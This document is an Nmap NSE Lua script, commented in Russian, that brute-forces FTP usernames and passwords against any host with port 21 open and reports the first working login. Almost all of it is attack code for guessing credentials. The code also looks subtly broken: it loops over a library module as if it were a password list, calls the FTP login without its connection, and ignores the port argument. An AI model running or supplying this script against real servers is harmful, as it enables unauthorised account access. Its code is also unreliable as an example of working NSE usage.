-- ftp_bruteforce.nse
--
-- Скрипт для перебора логинов и паролей FTP-сервера.
-- Проверяет популярные сочетания для выявления слабых учётных записей.
--
-- Требования:
--   nmap 7.80+, NSE ftp библиотека, LuaSocket
--
-- Автор: TeslaAI Expert
-- Лицензия: Same as Nmap

local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local ftp = require "ftp"
local string = require "string"
local table = require "table"
local creds = require "creds"  -- Предполагается внешний словарь логинов/паролей

description = [[
Перебор логинов и паролей FTP-сервера для выявления уязвимых учётных записей.
]]

author = "TeslaAI Expert"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"brute", "intrusive"}

portrule = shortport.port_or_service(21, "ftp")

local function try_login(host, username, password)
  local status, err = ftp.connect(host.ip, 21)
  if not status then
    return false, "Не удалось подключиться: " .. (err or "unknown error")
  end

  local login_status, login_err = ftp.login(username, password)
  if login_status then
    return true
  else
    return false, login_err
  end
end

action = function(host, port)
  local results = {}
  for _, cred in ipairs(creds) do
    local user = cred.username
    local pass = cred.password
    local ok, err = try_login(host, user, pass)
    if ok then
      table.insert(results, string.format("Успешный логин: %s / %s", user, pass))
      -- Остановить после первого успешного варианта (можно изменить логику)
      break
    end
  end

  if #results == 0 then
    return "Перебор неудачен. Уязвимых учётных записей не обнаружено."
  end

  return table.concat(results, "\n")
end
